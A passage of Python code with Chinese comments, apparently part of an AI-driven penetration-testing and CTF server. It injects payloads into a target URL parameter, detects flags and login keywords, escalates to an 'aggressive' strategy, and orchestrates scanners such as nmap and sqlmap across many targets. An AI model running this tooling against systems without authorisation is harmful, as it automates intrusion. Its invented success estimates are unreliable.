            return "xss_based"
        elif "php://" in payload or "data://" in payload:
            return "file_inclusion"
        else:
            return "general"

    def _estimate_payload_success_rate(payload: str, context_data: Dict) -> float:
        """估算Payload成功率"""
        base_rate = 0.3

        # 基于复杂度调整
        if len(payload) > 50:
            base_rate -= 0.1

        # 基于上下文调整
        if context_data.get("technology_stack"):
            tech_count = len(context_data["technology_stack"].get("detected_technologies", []))
            base_rate += tech_count * 0.05

        return min(base_rate, 0.9)

    # ==================== AI攻击执行辅助函数 ====================

    def _parse_ai_success_criteria(success_criteria: str) -> Dict[str, Any]:
        """解析AI成功标准"""
        indicators = {
            "flag_patterns": [r"ctf\{[^}]+\}", r"flag\{[^}]+\}", r"FLAG\{[^}]+\}"],
            "error_patterns": [r"error", r"exception", r"warning"],
            "success_keywords": ["admin", "success", "welcome", "logged in"],
            "response_codes": [200, 302, 500]
        }

        criteria_lower = success_criteria.lower()
        if "flag" in criteria_lower:
            indicators["priority"] = "flag_detection"
        elif "error" in criteria_lower:
            indicators["priority"] = "error_based"
        else:
            indicators["priority"] = "general"

        return indicators

    async def _execute_single_ai_attack(target_url: str, payload: str, success_indicators: Dict) -> Dict[str, Any]:
        """执行单个AI攻击"""
        try:
            import aiohttp
            import asyncio

            # 构造攻击URL
            attack_url = f"{target_url}?test={payload}"

            async with aiohttp.ClientSession() as session:
                start_time = datetime.now()
                async with session.get(attack_url, timeout=10) as response:
                    response_body = await response.text()
                    response_time = (datetime.now() - start_time).total_seconds()

                    # 分析响应
                    analysis = {
                        "success": False,
                        "response_code": response.status,
                        "response_time": response_time,
                        "response_body": response_body[:1000],  # 限制长度
                        "flags": [],
                        "vulnerabilities": [],
                        "errors": []
                    }

                    # 检查Flag
                    for pattern in success_indicators.get("flag_patterns", []):
                        import re
                        flags = re.findall(pattern, response_body, re.IGNORECASE)
                        if flags:
                            analysis["flags"].extend(flags)
                            analysis["success"] = True

                    # 检查错误指示器
                    for pattern in success_indicators.get("error_patterns", []):
                        if re.search(pattern, response_body, re.IGNORECASE):
                            analysis["errors"].append(pattern)
                            if "sql" in pattern.lower():
                                analysis["vulnerabilities"].append("sql_injection")

                    # 检查成功关键词
                    for keyword in success_indicators.get("success_keywords", []):
                        if keyword.lower() in response_body.lower():
                            analysis["success"] = True

                    return analysis

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "response_code": 0,
                "response_time": 0,
                "flags": [],
                "vulnerabilities": [],
                "errors": [str(e)]
            }

    def _check_ai_success_criteria(attack_result: Dict, success_indicators: Dict) -> bool:
        """检查AI成功标准"""
        priority = success_indicators.get("priority", "general")

        if priority == "flag_detection":
            return len(attack_result.get("flags", [])) > 0
        elif priority == "error_based":
            return len(attack_result.get("errors", [])) > 0
        else:
            return attack_result.get("success", False)

    async def _ai_adaptive_strategy_adjustment(recent_results: List[Dict], current_strategy: str, adaptation_strategy: str) -> Dict[str, Any]:
        """AI自适应策略调整"""
        success_rate = len([r for r in recent_results if r.get("success")]) / len(recent_results)

        if success_rate < 0.2:  # 成功率过低
            return {
                "action_type": "strategy_change",
                "new_strategy": "fallback_strategy",
                "reason": f"成功率过低 ({success_rate:.1%})",
                "adjustment": "增加Payload多样性"
            }
        elif success_rate > 0.8:  # 成功率很高
            return {
                "action_type": "strategy_optimize",
                "new_strategy": "aggressive_strategy",
                "reason": f"成功率很高 ({success_rate:.1%})",
                "adjustment": "集中攻击成功向量"
            }
        else:
            return {
                "action_type": "continue",
                "reason": f"成功率正常 ({success_rate:.1%})"
            }

    def _analyze_ai_attack_execution(attack_results: List[Dict], success_indicators: Dict, adaptation_actions: List[Dict]) -> Dict[str, Any]:
        """分析AI攻击执行结果"""
        total_attacks = len(attack_results)
        successful_attacks = len([r for r in attack_results if r.get("success")])

        analysis = {
            "success_rate": successful_attacks / total_attacks if total_attacks > 0 else 0,
            "avg_response_time": sum(r.get("response_time", 0) for r in attack_results) / total_attacks if total_attacks > 0 else 0,
            "plan_effectiveness": "高" if successful_attacks / total_attacks > 0.6 else "中" if successful_attacks / total_attacks > 0.3 else "低",
            "adaptation_effectiveness": "高" if len(adaptation_actions) > 0 and any(a["action_type"] != "continue" for a in adaptation_actions) else "中",
            "payload_quality": "高" if sum(len(r.get("flags", [])) for r in attack_results) > 0 else "中",
            "learning_insights": [
                f"成功率: {successful_attacks / total_attacks:.1%}",
                f"平均响应时间: {sum(r.get('response_time', 0) for r in attack_results) / total_attacks:.2f}秒" if total_attacks > 0 else "无数据",
                f"策略调整次数: {len(adaptation_actions)}"
            ],
            "success_criteria_met": any(len(r.get("flags", [])) > 0 for r in attack_results),
            "duration": f"{total_attacks * 2}秒（估算）"
        }

        return analysis

    # ==================== AI学习和决策辅助函数 ====================

    def _assess_ai_learning_quality(learning_entry: Dict) -> Dict[str, Any]:
        """评估AI学习质量"""
        quality_score = 0.5

        # 内容丰富度
        if learning_entry.get("success_patterns"):
            quality_score += 0.2
        if learning_entry.get("failure_analysis"):
            quality_score += 0.2
        if learning_entry.get("new_insights"):
            quality_score += 0.2

        # 置信度因子
        confidence = learning_entry.get("confidence_score", 0.5)
        quality_score = quality_score * confidence

        return {
            "overall_score": min(quality_score, 1.0),
            "content_richness": 0.8 if all([learning_entry.get("success_patterns"), learning_entry.get("failure_analysis"), learning_entry.get("new_insights")]) else 0.5,
            "confidence_factor": confidence,
            "applicability": "高" if quality_score > 0.7 else "中" if quality_score > 0.4 else "低"
        }

    def _update_system_knowledge(learning_entry: Dict, learning_quality: Dict) -> Dict[str, Any]:
        """更新系统知识库"""
        updates = {
            "patterns_updated": 0,
            "insights_added": 0,
            "knowledge_base_version": "1.0"
        }

        if learning_quality["overall_score"] > 0.6:
            if learning_entry.get("success_patterns"):
                updates["patterns_updated"] += 1
            if learning_entry.get("new_insights"):
                updates["insights_added"] += 1

        return updates

    def _analyze_strategic_option(option: str, situation: str, ai_reasoning: str, risk_tolerance: str) -> Dict[str, Any]:
        """分析战略选项"""
        # 简化的选项分析
        base_score = 0.5

        # 基于风险承受度调整
        risk_multiplier = {"low": 0.8, "medium": 1.0, "high": 1.2}.get(risk_tolerance, 1.0)

        # 基于选项类型调整
        if "攻击" in option or "exploit" in option.lower():
            base_score += 0.2 if risk_tolerance == "high" else -0.1
        elif "分析" in option or "analyze" in option.lower():
            base_score += 0.1
        elif "等待" in option or "wait" in option.lower():
            base_score -= 0.2

        overall_score = base_score * risk_multiplier

        return {
            "option": option,
            "overall_score": min(overall_score, 1.0),
            "risk_level": "高" if "攻击" in option else "中" if "分析" in option else "低",
            "expected_outcome": f"基于 {option} 的预期结果",
            "reasoning": f"考虑风险承受度 ({risk_tolerance}) 和当前情况的分析结果"
        }

    def _generate_ai_decision_matrix(option_analyses: List[Dict], situation: str, risk_tolerance: str) -> Dict[str, Any]:
        """生成AI决策矩阵"""
        matrix = {
            "criteria": ["成功概率", "风险级别", "资源消耗", "时间成本"],
            "weights": {"low": [0.4, 0.4, 0.1, 0.1], "medium": [0.35, 0.25, 0.2, 0.2], "high": [0.3, 0.1, 0.3, 0.3]}.get(risk_tolerance, [0.25, 0.25, 0.25, 0.25]),
            "option_scores": {analysis["option"]: analysis["overall_score"] for analysis in option_analyses}
        }

        return matrix

    def _generate_risk_assessment(best_option: Dict, situation: str, risk_tolerance: str) -> Dict[str, Any]:
        """生成风险评估"""
        return {
            "option": best_option["option"],
            "risk_level": best_option["risk_level"],
            "mitigation_strategies": [
                "监控执行过程",
                "设置回退策略",
                "限制攻击强度"
            ],
            "success_probability": best_option["overall_score"],
            "recommended_precautions": ["备份当前状态", "设置超时限制"]
        }

    def _generate_execution_recommendations(best_option: Dict, decision_matrix: Dict) -> List[str]:
        """生成执行建议"""
        recommendations = [
            f"执行选择的策略: {best_option['option']}",
            f"监控成功指标: {best_option['expected_outcome']}",
            "在执行过程中保持自适应调整",
            "记录执行结果用于后续学习"
        ]

        if best_option["risk_level"] == "高":
            recommendations.append("高风险选项，建议分阶段执行")

        return recommendations

    return mcp

# ==================== 多目标协调和攻击编排系统 ====================

@dataclass
class TargetProfile:
    """目标配置文件数据类"""
    target_id: str
    target_url: str
    target_type: str = "unknown"  # web, network, mobile, cloud
    priority: int = 1  # 1-10, 10 为最高优先级
    status: str = "pending"  # pending, active, completed, failed
    assigned_strategy: Optional[str] = None
    discovered_assets: Dict[str, Any] = field(default_factory=dict)
    vulnerabilities: List[Dict[str, Any]] = field(default_factory=list)
    attack_progress: Dict[str, Any] = field(default_factory=dict)
    dependency_targets: List[str] = field(default_factory=list)  # 依赖的其他目标
    estimated_completion_time: Optional[datetime] = None
    last_update: datetime = field(default_factory=datetime.now)
    metadata: Dict[str, Any] = field(default_factory=dict)

@dataclass
class AttackTask:
    """攻击任务数据类"""
    task_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    target_id: str = ""
    tool_name: str = ""
    parameters: Dict[str, Any] = field(default_factory=dict)
    strategy_context: str = ""
    priority: int = 1
    status: str = "queued"  # queued, running, completed, failed, paused
    dependencies: List[str] = field(default_factory=list)  # 依赖的其他任务ID
    estimated_duration: int = 30  # 预估执行时间（秒）
    retry_count: int = 0
    max_retries: int = 3
    created_at: datetime = field(default_factory=datetime.now)
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    result: Optional[Dict[str, Any]] = None
    error_message: Optional[str] = None

class MultiTargetOrchestrator:
    """多目标协调攻击编排器"""

    def __init__(self):
        self.targets: Dict[str, TargetProfile] = {}
        self.attack_tasks: Dict[str, AttackTask] = {}
        self.task_queue: List[str] = []  # 任务ID队列
        self.running_tasks: Dict[str, AttackTask] = {}
        self.completed_tasks: Dict[str, AttackTask] = {}
        self.failed_tasks: Dict[str, AttackTask] = {}

        # 协调参数
        self.max_concurrent_tasks = 5
        self.max_tasks_per_target = 3
        self.coordination_strategies = {
            "adaptive": self._adaptive_strategy
        }
        self.current_strategy = "adaptive"

        # 性能监控
        self.performance_metrics = {
            "total_targets": 0,
            "completed_targets": 0,
            "failed_targets": 0,
            "average_completion_time": 0,
            "success_rate": 0,
            "resource_utilization": 0
        }

    def add_target(self, target_url: str, target_type: str = "unknown",
                   priority: int = 1, dependencies: List[str] = None) -> str:
        """添加新目标到协调系统"""
        target_id = f"target_{int(time.time())}_{random.randint(1000, 9999)}"

        target_profile = TargetProfile(
            target_id=target_id,
            target_url=target_url,
            target_type=target_type,
            priority=priority,
            dependency_targets=dependencies or []
        )

        self.targets[target_id] = target_profile
        self.performance_metrics["total_targets"] += 1

        return target_id

    def orchestrate_attack(self, strategy: str = None) -> Dict[str, Any]:
        """执行攻击编排"""
        if strategy:
            self.current_strategy = strategy

        if self.current_strategy not in self.coordination_strategies:
            raise ValueError(f"未知的协调策略: {self.current_strategy}")

        orchestration_plan = self.coordination_strategies[self.current_strategy]()

        return {
            "orchestration_strategy": self.current_strategy,
            "execution_plan": orchestration_plan,
            "targets_count": len(self.targets),
            "tasks_count": len(self.attack_tasks),
            "estimated_total_time": self._estimate_total_execution_time(orchestration_plan)
        }

    def _adaptive_strategy(self) -> Dict[str, Any]:
        """自适应策略 - 根据目标类型和依赖关系动态调整"""
        execution_plan = []

        # 分析目标类型分布
        target_types = {}
        for target in self.targets.values():
            target_types[target.target_type] = target_types.get(target.target_type, 0) + 1

        # 处理依赖关系
        dependency_graph = self._build_dependency_graph()
        execution_order = self._topological_sort(dependency_graph)

        # 为每个执行阶段分配任务
        for phase, target_ids in enumerate(execution_order):
            phase_tasks = []

            for target_id in target_ids:
                target_tasks = [task for task in self.attack_tasks.values()
                              if task.target_id == target_id and task.status == "queued"]

                # 根据目标类型选择最佳工具组合
                optimized_tasks = self._optimize_task_sequence(target_tasks, self.targets[target_id])
                phase_tasks.extend(optimized_tasks)

            if phase_tasks:
                execution_plan.append({
                    "phase": phase + 1,
                    "execution_mode": "adaptive",
                    "target_count": len(target_ids),
                    "tasks": [
                        {
                            "task_id": task.task_id,
                            "target_id": task.target_id,
                            "tool": task.tool_name,
                            "adaptation_reason": task.metadata.get("adaptation_reason", "优化选择"),
                            "estimated_duration": task.estimated_duration
                        } for task in phase_tasks
                    ]
                })

        return {"strategy": "adaptive", "execution_phases": execution_plan}

    def _build_dependency_graph(self) -> Dict[str, List[str]]:
        """构建目标依赖图"""
        graph = {}
        for target_id, target in self.targets.items():
            graph[target_id] = target.dependency_targets
        return graph

    def _topological_sort(self, graph: Dict[str, List[str]]) -> List[List[str]]:
        """拓扑排序，返回按依赖层级排序的目标组"""
        in_degree = {node: 0 for node in graph}

        # 计算入度
        for node in graph:
            for neighbor in graph[node]:
                if neighbor in in_degree:
                    in_degree[neighbor] += 1

        # 按层级分组
        levels = []
        remaining_nodes = set(graph.keys())

        while remaining_nodes:
            # 找到当前层级的节点（入度为0）
            current_level = [node for node in remaining_nodes if in_degree[node] == 0]
            if not current_level:
                break

            levels.append(current_level)

            # 移除当前层级的节点并更新入度
            for node in current_level:
                remaining_nodes.remove(node)
                for neighbor in graph[node]:
                    if neighbor in in_degree:
                        in_degree[neighbor] -= 1

        return levels

    def _optimize_task_sequence(self, tasks: List[AttackTask], target: TargetProfile) -> List[AttackTask]:
        """根据目标特征优化任务序列"""
        optimization_rules = {
            "web": ["nmap", "dirb", "nikto", "sqlmap", "xsser"],
            "network": ["nmap", "masscan", "zmap", "ncrack"],
            "mobile": ["apktool", "jadx", "frida"],
            "cloud": ["cloudenum", "s3scanner", "awscli"]
        }

        preferred_order = optimization_rules.get(target.target_type, [])
        optimized_tasks = []

        # 首先添加按优先顺序排列的工具
        for tool_name in preferred_order:
            matching_tasks = [task for task in tasks if task.tool_name == tool_name]
            optimized_tasks.extend(matching_tasks)

        # 添加其他任务
        remaining_tasks = [task for task in tasks if task not in optimized_tasks]
        remaining_tasks.sort(key=lambda t: t.priority, reverse=True)
        optimized_tasks.extend(remaining_tasks)

        return optimized_tasks

    def _estimate_total_execution_time(self, orchestration_plan: Dict[str, Any]) -> int:
        """估算总执行时间"""
        total_time = 0
        phases = orchestration_plan.get("execution_phases", [])

        for phase in phases:
            phase_tasks = phase.get("tasks", [])
            if phase_tasks:
                # 假设阶段内任务可以部分并行
                phase_time = max([task.get("estimated_duration", 30) for task in phase_tasks] or [0])
                total_time += phase_time

        return total_time

    def get_orchestration_status(self) -> Dict[str, Any]:
        """获取编排状态"""
        total_tasks = len(self.attack_tasks)
        running_count = len(self.running_tasks)
        completed_count = len(self.completed_tasks)
        failed_count = len(self.failed_tasks)
        queued_count = len([task for task in self.attack_tasks.values() if task.status == "queued"])

        return {
            "total_targets": len(self.targets),
            "active_targets": len([t for t in self.targets.values() if t.status == "active"]),
            "completed_targets": len([t for t in self.targets.values() if t.status == "completed"]),
            "total_tasks": total_tasks,
            "queued_tasks": queued_count,
            "running_tasks": running_count,
            "completed_tasks": completed_count,
            "failed_tasks": failed_count,
            "success_rate": (completed_count / total_tasks * 100) if total_tasks > 0 else 0,
            "current_strategy": self.current_strategy,
            "resource_utilization": (running_count / self.max_concurrent_tasks * 100) if self.max_concurrent_tasks > 0 else 0,
            "performance_metrics": self.performance_metrics
        }

# 全局多目标编排器实例
multi_target_orchestrator = MultiTargetOrchestrator()

# ==================== 高级上下文关联和模式识别系统 ====================

@dataclass
class ContextPattern:
    """上下文模式数据类"""
    pattern_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    pattern_name: str = ""
    pattern_type: str = "behavioral"  # behavioral, structural, temporal, causal
    pattern_signature: Dict[str, Any] = field(default_factory=dict)
    occurrence_count: int = 0
    success_rate: float = 0.0
    associated_strategies: List[str] = field(default_factory=list)
    confidence_score: float = 0.0
    last_seen: datetime = field(default_factory=datetime.now)
    metadata: Dict[str, Any] = field(default_factory=dict)

class AdvancedContextAnalyzer:
    """高级上下文关联和模式识别分析器"""

    def __init__(self):
        self.pattern_repository: Dict[str, ContextPattern] = {}
        self.behavioral_sequences: List[List[Dict[str, Any]]] = []

        # 分析参数
        self.min_pattern_confidence = 0.6
        self.min_correlation_strength = 0.7
        self.pattern_discovery_window = 100  # 最近100次交互

    def analyze_context_patterns(self, session_history: List[Dict[str, Any]],
                                current_context: Dict[str, Any]) -> Dict[str, Any]:
        """分析上下文模式和关联"""
        analysis_results = {
            "discovered_patterns": [],
            "strong_correlations": [],
            "behavioral_insights": {},
            "predictive_recommendations": [],
            "confidence_metrics": {}
        }

        try:
            # 1. 发现新模式
            new_patterns = self._discover_patterns(session_history, current_context)
            analysis_results["discovered_patterns"] = new_patterns

            # 2. 分析上下文关联
            correlations = self._analyze_correlations(session_history, current_context)
            analysis_results["strong_correlations"] = correlations

            # 3. 提取行为洞察
            behavioral_insights = self._extract_behavioral_insights(session_history)
            analysis_results["behavioral_insights"] = behavioral_insights

            # 4. 生成预测性建议
            recommendations = self._generate_predictive_recommendations(current_context, new_patterns, correlations)
            analysis_results["predictive_recommendations"] = recommendations

        except Exception as e:
            analysis_results["error"] = str(e)

        return analysis_results

    def _discover_patterns(self, session_history: List[Dict[str, Any]],
                          current_context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """发现新的上下文模式"""
        discovered_patterns = []

        # 序列模式发现
        sequence_patterns = self._discover_sequence_patterns(session_history)
        discovered_patterns.extend(sequence_patterns)

        # 工具使用模式
        tool_patterns = self._discover_tool_usage_patterns(session_history)
        discovered_patterns.extend(tool_patterns)

        # 成功/失败模式
        outcome_patterns = self._discover_outcome_patterns(session_history)
        discovered_patterns.extend(outcome_patterns)

        # 更新模式库
        for pattern in discovered_patterns:
            self._update_pattern_repository(pattern)

        return discovered_patterns

    def _discover_sequence_patterns(self, session_history: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """发现序列模式"""
        patterns = []

        if len(session_history) < 3:
            return patterns

        # 分析工具调用序列
        tool_sequences = []
        for entry in session_history:
            tools_used = entry.get("tools_used", [])
            if tools_used:
                tool_sequences.extend(tools_used)

        # 查找频繁序列
        frequent_sequences = self._find_frequent_sequences(tool_sequences, min_length=2, min_support=2)

        for sequence, support in frequent_sequences:
            pattern = {
                "pattern_name": f"tool_sequence_{'-'.join(sequence)}",
                "pattern_type": "sequential",
                "pattern_signature": {
                    "sequence": sequence,
                    "support": support,
                    "length": len(sequence)
                },
                "confidence_score": min(support / len(session_history), 1.0)
            }
            patterns.append(pattern)

        return patterns

    def _discover_tool_usage_patterns(self, session_history: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """发现工具使用模式"""
        patterns = []

        # 统计工具使用频率
        tool_usage = {}
        tool_success_rate = {}

        for entry in session_history:
            tools_used = entry.get("tools_used", [])
            success_indicators = entry.get("success_indicators", {})

            for tool in tools_used:
                tool_usage[tool] = tool_usage.get(tool, 0) + 1

                # 计算成功率
                if tool not in tool_success_rate:
                    tool_success_rate[tool] = {"success": 0, "total": 0}

                tool_success_rate[tool]["total"] += 1
                if success_indicators.get(tool, False):
                    tool_success_rate[tool]["success"] += 1

        # 识别高效工具组合
        for tool, usage_count in tool_usage.items():
            if usage_count >= 3:  # 至少使用3次
                success_rate = tool_success_rate[tool]["success"] / tool_success_rate[tool]["total"]

                if success_rate > 0.7:  # 成功率大于70%
                    pattern = {
                        "pattern_name": f"effective_tool_{tool}",
                        "pattern_type": "tool_effectiveness",
                        "pattern_signature": {
                            "tool": tool,
                            "usage_count": usage_count,
                            "success_rate": success_rate
                        },
                        "confidence_score": success_rate
                    }
                    patterns.append(pattern)

        return patterns

    def _discover_outcome_patterns(self, session_history: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """发现结果模式"""
        patterns = []

        # 分析成功和失败的上下文
        success_contexts = []
        failure_contexts = []

        for entry in session_history:
            outcome = entry.get("outcome", "unknown")
            context_features = self._extract_context_features(entry)

            if outcome == "success":
                success_contexts.append(context_features)
            elif outcome == "failure":
                failure_contexts.append(context_features)

        # 识别成功模式
        if len(success_contexts) >= 2:
            success_pattern = self._identify_common_features(success_contexts)
            if success_pattern:
                pattern = {
                    "pattern_name": "success_context_pattern",
                    "pattern_type": "outcome_success",
                    "pattern_signature": success_pattern,
                    "confidence_score": len(success_contexts) / max(len(session_history), 1)
                }
                patterns.append(pattern)

        return patterns

    def _analyze_correlations(self, session_history: List[Dict[str, Any]],
                             current_context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """分析上下文关联"""
        correlations = []

        # 工具-结果关联
        tool_outcome_correlations = self._analyze_tool_outcome_correlations(session_history)
        correlations.extend(tool_outcome_correlations)

        return correlations

    def _analyze_tool_outcome_correlations(self, session_history: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """分析工具与结果的关联"""
        correlations = []

        # 统计工具和结果的共现
        tool_outcome_matrix = {}

        for entry in session_history:
            tools_used = entry.get("tools_used", [])
            outcome = entry.get("outcome", "unknown")

            for tool in tools_used:
                if tool not in tool_outcome_matrix:
                    tool_outcome_matrix[tool] = {"success": 0, "failure": 0, "unknown": 0}
                tool_outcome_matrix[tool][outcome] += 1

        # 计算关联强度
        for tool, outcomes in tool_outcome_matrix.items():
            total = sum(outcomes.values())
            if total >= 3:  # 至少3次观察
                success_rate = outcomes["success"] / total

                if success_rate > 0.8 or success_rate < 0.2:  # 强关联
                    correlation = {
                        "correlation_type": "tool_outcome",
                        "source": tool,
                        "target": "success" if success_rate > 0.5 else "failure",
                        "correlation_strength": abs(success_rate - 0.5) * 2,
                        "evidence_count": total
                    }
                    correlations.append(correlation)

        return correlations

    def _extract_behavioral_insights(self, session_history: List[Dict[str, Any]]) -> Dict[str, Any]:
        """提取行为洞察"""
        insights = {
            "total_interactions": len(session_history),
            "tool_diversity": 0,
            "success_rate": 0,
            "common_patterns": []
        }

        if not session_history:
            return insights

        # 计算工具多样性
        all_tools = set()
        success_count = 0

        for entry in session_history:
            tools_used = entry.get("tools_used", [])
            all_tools.update(tools_used)

            if entry.get("outcome") == "success":
                success_count += 1

        insights["tool_diversity"] = len(all_tools)
        insights["success_rate"] = success_count / len(session_history)

        return insights

    def _generate_predictive_recommendations(self, current_context: Dict[str, Any],
                                           patterns: List[Dict[str, Any]],
                                           correlations: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """生成预测性建议"""
        recommendations = []

        # 基于模式的建议
        for pattern in patterns:
            if pattern.get("confidence_score", 0) > 0.7:
                recommendation = {
                    "type": "pattern_based",
                    "suggestion": f"根据模式 {pattern['pattern_name']}，建议继续使用相关策略",
                    "confidence": pattern.get("confidence_score", 0),
                    "reasoning": f"该模式在历史中表现良好，置信度为 {pattern.get('confidence_score', 0):.2f}"
                }
                recommendations.append(recommendation)

        # 基于关联的建议
        for correlation in correlations:
            if correlation.get("correlation_strength", 0) > 0.8:
                recommendation = {
                    "type": "correlation_based",
                    "suggestion": f"推荐使用工具 {correlation['source']}",
                    "confidence": correlation.get("correlation_strength", 0),
                    "reasoning": f"该工具与成功结果有强关联性，关联强度为 {correlation.get('correlation_strength', 0):.2f}"
                }
                recommendations.append(recommendation)

        return recommendations

    def _find_frequent_sequences(self, sequences: List[str], min_length: int = 2, min_support: int = 2) -> List[tuple]:
        """查找频繁序列"""
        from collections import defaultdict

        if len(sequences) < min_length:
            return []

        # 生成所有可能的子序列
        subsequences = defaultdict(int)

        for i in range(len(sequences) - min_length + 1):
            for length in range(min_length, min(len(sequences) - i + 1, 5)):  # 最大长度为5
                subseq = tuple(sequences[i:i + length])
                subsequences[subseq] += 1

        # 筛选频繁序列
        frequent = [(seq, count) for seq, count in subsequences.items() if count >= min_support]
        frequent.sort(key=lambda x: x[1], reverse=True)

        return frequent[:10]  # 返回前10个最频繁的序列

    def _extract_context_features(self, entry: Dict[str, Any]) -> Dict[str, Any]:
        """提取上下文特征"""
        features = {}

        # 提取关键特征
        features["tools_used"] = entry.get("tools_used", [])
        features["target_type"] = entry.get("target_type", "unknown")
        features["strategy"] = entry.get("strategy", "unknown")
        features["session_depth"] = entry.get("session_depth", 0)

        return features

    def _identify_common_features(self, contexts: List[Dict[str, Any]]) -> Dict[str, Any]:
        """识别共同特征"""
        if not contexts:
            return {}

        common_features = {}

        # 查找在多数上下文中出现的特征
        for feature_name in contexts[0].keys():
            feature_values = [ctx.get(feature_name) for ctx in contexts if feature_name in ctx]

            if len(set(str(v) for v in feature_values)) == 1:  # 所有值都相同
                common_features[feature_name] = feature_values[0]

        return common_features if common_features else None

    def _update_pattern_repository(self, pattern: Dict[str, Any]):
        """更新模式库"""
        pattern_name = pattern.get("pattern_name", "unknown")

        if pattern_name in self.pattern_repository:
            # 更新现有模式
            existing = self.pattern_repository[pattern_name]
            existing.occurrence_count += 1
            existing.last_seen = datetime.now()
            # 更新置信度（移动平均）
            existing.confidence_score = (existing.confidence_score * 0.8 +
                                       pattern.get("confidence_score", 0) * 0.2)
        else:
            # 创建新模式
            new_pattern = ContextPattern(
                pattern_name=pattern_name,
                pattern_type=pattern.get("pattern_type", "unknown"),
                pattern_signature=pattern.get("pattern_signature", {}),
                occurrence_count=1,
                confidence_score=pattern.get("confidence_score", 0)
            )
            self.pattern_repository[pattern_name] = new_pattern

# 全局高级上下文分析器实例
advanced_context_analyzer = AdvancedContextAnalyzer()

# ==================== 攻击智能知识图谱系统 ====================

@dataclass
class KnowledgeNode:
    """知识图谱节点数据类"""
    node_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    node_type: str = ""  # target, tool, vulnerability, technique, strategy
    node_name: str = ""
    properties: Dict[str, Any] = field(default_factory=dict)
    confidence_score: float = 0.0
    created_at: datetime = field(default_factory=datetime.now)
    last_updated: datetime = field(default_factory=datetime.now)
    tags: List[str] = field(default_factory=list)

@dataclass
class KnowledgeRelation:
    """知识图谱关系数据类"""
    relation_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    source_node_id: str = ""
    target_node_id: str = ""
    relation_type: str = ""  # affects, requires, enables, counters, similar_to
    relation_strength: float = 0.0
    evidence_count: int = 0
    properties: Dict[str, Any] = field(default_factory=dict)
    created_at: datetime = field(default_factory=datetime.now)

class AttackKnowledgeGraph:
    """攻击智能知识图谱"""

    def __init__(self):
        self.nodes: Dict[str, KnowledgeNode] = {}
        self.relations: Dict[str, KnowledgeRelation] = {}
        self.node_index: Dict[str, List[str]] = {}  # 按类型索引节点
        self.relation_index: Dict[str, List[str]] = {}  # 按类型索引关系

        # 图谱参数
        self.min_relation_strength = 0.3
        self.max_nodes_per_type = 1000

        # 预定义知识
        self._initialize_base_knowledge()

    def _initialize_base_knowledge(self):
        """初始化基础攻击知识"""
        # 常见目标类型
        target_types = [
            {"name": "Web应用", "properties": {"common_ports": [80, 443, 8080], "protocols": ["HTTP", "HTTPS"]}},
            {"name": "数据库", "properties": {"common_ports": [3306, 5432, 1433], "protocols": ["MySQL", "PostgreSQL", "MSSQL"]}},
            {"name": "网络设备", "properties": {"common_ports": [22, 23, 161], "protocols": ["SSH", "Telnet", "SNMP"]}},
        ]

        for target_type in target_types:
            self.add_node("target_type", target_type["name"], target_type["properties"], confidence=0.9)

        # 常见工具和技术
        tools_techniques = [
            {"tool": "nmap", "technique": "端口扫描", "effectiveness": {"web": 0.9, "network": 0.95, "database": 0.8}},
            {"tool": "sqlmap", "technique": "SQL注入", "effectiveness": {"web": 0.9, "database": 0.95, "network": 0.3}},
            {"tool": "dirb", "technique": "目录枚举", "effectiveness": {"web": 0.85, "network": 0.2, "database": 0.1}},
        ]

        for item in tools_techniques:
            tool_node = self.add_node("tool", item["tool"], {"type": "penetration_testing"}, confidence=0.9)
            technique_node = self.add_node("technique", item["technique"], item["effectiveness"], confidence=0.9)
            self.add_relation(tool_node, technique_node, "implements", strength=0.9)

    def add_node(self, node_type: str, node_name: str, properties: Dict[str, Any] = None,
                 confidence: float = 0.5, tags: List[str] = None) -> str:
        """添加知识节点"""
        node = KnowledgeNode(
            node_type=node_type,
            node_name=node_name,
            properties=properties or {},
            confidence_score=confidence,
            tags=tags or []
        )

        self.nodes[node.node_id] = node

        # 更新索引
        if node_type not in self.node_index:
            self.node_index[node_type] = []
        self.node_index[node_type].append(node.node_id)

        return node.node_id

    def add_relation(self, source_node_id: str, target_node_id: str, relation_type: str,
                    strength: float = 0.5, properties: Dict[str, Any] = None) -> str:
        """添加知识关系"""
        if source_node_id not in self.nodes or target_node_id not in self.nodes:
            raise ValueError("源节点或目标节点不存在")

        relation = KnowledgeRelation(
            source_node_id=source_node_id,
            target_node_id=target_node_id,
            relation_type=relation_type,
            relation_strength=strength,
            properties=properties or {},
            evidence_count=1
        )

        self.relations[relation.relation_id] = relation

        # 更新索引
        if relation_type not in self.relation_index:
            self.relation_index[relation_type] = []
        self.relation_index[relation_type].append(relation.relation_id)

        return relation.relation_id

    def query_nodes(self, node_type: str = None, name_pattern: str = None,
                   min_confidence: float = 0.0) -> List[Dict[str, Any]]:
        """查询知识节点"""
        results = []

        target_nodes = []
        if node_type:
            target_nodes = [self.nodes[nid] for nid in self.node_index.get(node_type, [])]
        else:
            target_nodes = list(self.nodes.values())

        for node in target_nodes:
            if node.confidence_score >= min_confidence:
                if not name_pattern or name_pattern.lower() in node.node_name.lower():
                    results.append({
                        "node_id": node.node_id,
                        "node_type": node.node_type,
                        "node_name": node.node_name,
                        "properties": node.properties,
                        "confidence_score": node.confidence_score,
                        "tags": node.tags
                    })

        return results

    def recommend_tools_for_target(self, target_properties: Dict[str, Any]) -> List[Dict[str, Any]]:
        """根据目标特征推荐工具"""
        recommendations = []

        # 查找工具节点
        tool_nodes = self.query_nodes(node_type="tool")

        for tool in tool_nodes:
            tool_id = tool["node_id"]

            # 计算匹配度
            effectiveness_score = self._calculate_tool_effectiveness(target_properties, tool["properties"])

            if effectiveness_score > 0.3:  # 最低有效性阈值
                recommendations.append({
                    "tool_name": tool["node_name"],
                    "tool_id": tool_id,
                    "effectiveness_score": effectiveness_score,
                    "confidence": tool["confidence_score"],
